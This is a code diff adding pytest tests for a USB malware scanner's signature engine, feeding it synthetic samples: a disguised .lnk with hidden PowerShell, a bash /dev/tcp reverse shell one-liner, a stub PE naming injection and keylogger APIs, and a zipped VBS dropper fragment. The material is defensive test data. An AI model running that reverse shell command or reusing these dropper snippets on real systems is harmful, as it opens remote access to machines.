@@ -160,3 +160,50 @@ def test_scenario_2_service_critical_alert_and_block(tmp_path: Path):
     assert scan_event.severity == EventSeverity.CRITICAL
     assert scan_event.details["has_threats"] is True
     assert device_id in blocker.blocked_devices
+
+
+def test_yar_rules_file_loading_and_lnk_reverse_shell_detection(tmp_path: Path) -> None:
+    engine = SignatureEngine()
+    inventory = engine.get_rule_inventory()
+    rule_names = {r["name"] for r in inventory}
+
+    assert {"EICAR_Test_File", "PowerShell_Download_Cradle", "LNK_Embedded_Command_Dropper", "Reverse_Shell_Primitive"}.issubset(rule_names)
+
+    # Simulate malicious Windows .lnk header + UTF-16LE embedded PowerShell payload
+    lnk_bytes = b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 32 + "powershell.exe -w hidden".encode("utf-16-le")
+    lnk_matches = [m[0] for m in engine.scan_content(lnk_bytes, filename="Documents.lnk")]
+    assert "LNK_Embedded_Command_Dropper" in lnk_matches
+
+    # Reverse shell primitive rule from usb_malware.yar
+    revshell_bytes = b"bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
+    rs_matches = [m[0] for m in engine.scan_content(revshell_bytes, filename="run.sh")]
+    assert "Reverse_Shell_Primitive" in rs_matches
+
+    # Heuristic keyword indicator flags suspicious doc non-destructively without yara: deletion
+    doc = tmp_path / "USB_Malware_Analysis_Notes.txt"
+    doc.write_text("Discussion of ransomware and keylogger defense concepts.", encoding="utf-8")
+    flags = engine.scan_file(doc, sha256="deadbeef")
+    assert "suspicious_keyword_indicator" in flags
+    assert not any(f.startswith("yara:") for f in flags)
+
+
+def test_md5_ioc_file_pe_yar_rules_and_zip_member_inspection(tmp_path: Path) -> None:
+    import zipfile
+    from usb_analyzer.storage_scanner.signatures import EICAR_MD5
+
+    engine = SignatureEngine()
+    # Loaded from malware_hashes.txt
+    assert engine.check_hash("unused", md5=EICAR_MD5) is not None
+    assert engine.check_hash("ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa") is not None
+
+    # Compiled PE import & UPX rules
+    pe_sample = b"MZ" + b"\x00" * 60 + b"VirtualAlloc\x00WriteProcessMemory\x00SetWindowsHookEx\x00GetAsyncKeyState\x00UPX0"
+    matched_rules = {m[0] for m in engine.scan_content(pe_sample, filename="spy.exe")}
+    assert {"Suspicious_PE_Injection_APIs", "Suspicious_PE_Keylogger_APIs", "UPX_Packed_PE_Binary"}.issubset(matched_rules)
+
+    # Zip archive containing disguised script payload should be scanned safely
+    z_path = tmp_path / "bundle.zip"
+    with zipfile.ZipFile(z_path, "w") as zf:
+        zf.writestr("inner_dropper.vbs", 'Set x = CreateObject("WScript.Shell"): Set a = CreateObject("ADODB.Stream")')
+    z_flags = engine.scan_file(z_path, sha256="0" * 64, md5="0" * 32)
+    assert "yara:VBS_WScript_Download_Dropper" in z_flags
